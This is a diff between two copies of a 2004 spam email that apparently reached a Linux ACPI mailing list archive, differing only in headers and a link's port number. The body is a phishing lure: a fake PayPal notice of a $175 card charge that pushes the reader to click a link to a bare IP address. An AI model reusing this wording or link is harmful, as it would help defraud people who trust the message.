@@ -1,10 +1,10 @@
 From: exchange-robot-b7mz0PDhOr/QT0dZR+AlfA@public.gmane.org
 Subject: CONFIRMATION
 Date: Tue, 7 Dec 2004 20:01:39 +0900
-Message-ID: <000501c4dc97$903e7040$2d418680@junixp>
+Message-ID: <000a01c4dc97$90a28940$2d418680@junixp>
 Mime-Version: 1.0
 Content-Type: multipart/mixed;
-	boundary="----=_NextPart_000_0002_01C4DC97.903E7040"
+	boundary="----=_NextPart_000_0007_01C4DC97.90A28940"
 Return-path: <acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
 Sender: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 Errors-To: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
@@ -20,7 +20,7 @@ List-Id: linux-acpi@vger.kernel.org
 
 This is a multi-part message in MIME format.
 
-------=_NextPart_000_0002_01C4DC97.903E7040
+------=_NextPart_000_0007_01C4DC97.90A28940
 Content-Type: text/html;
 	charset="iso-8859-2
 Content-Transfer-Encoding: quoted-printable
@@ -37,7 +37,7 @@ Content-Transfer-Encoding: quoted-printable
 <p><i>Congratulations! PayPal has successfully charged $175 to your credit
 card. Your order tracking number is A866DEC0, and your item will be shipped
 within three business days. </i></p>
-<p><i>To see details please click this <a href=3D"http://128.134.65.45:1640/index.htm"><b>link</b></a>.
+<p><i>To see details please click this <a href=3D"http://128.134.65.45:1639/index.htm"><b>link</b></a>.
 </i></p>
 <p><i>DO NOT REPLY TO THIS MESSAGE VIA EMAIL! This email is being sent by
 an automated message system and the reply will not be received. </i></p>
@@ -50,7 +50,7 @@ an automated message system and the reply will not be received. </i></p>
 
 
 
-------=_NextPart_000_0002_01C4DC97.903E7040--
+------=_NextPart_000_0007_01C4DC97.90A28940--
 
 
 
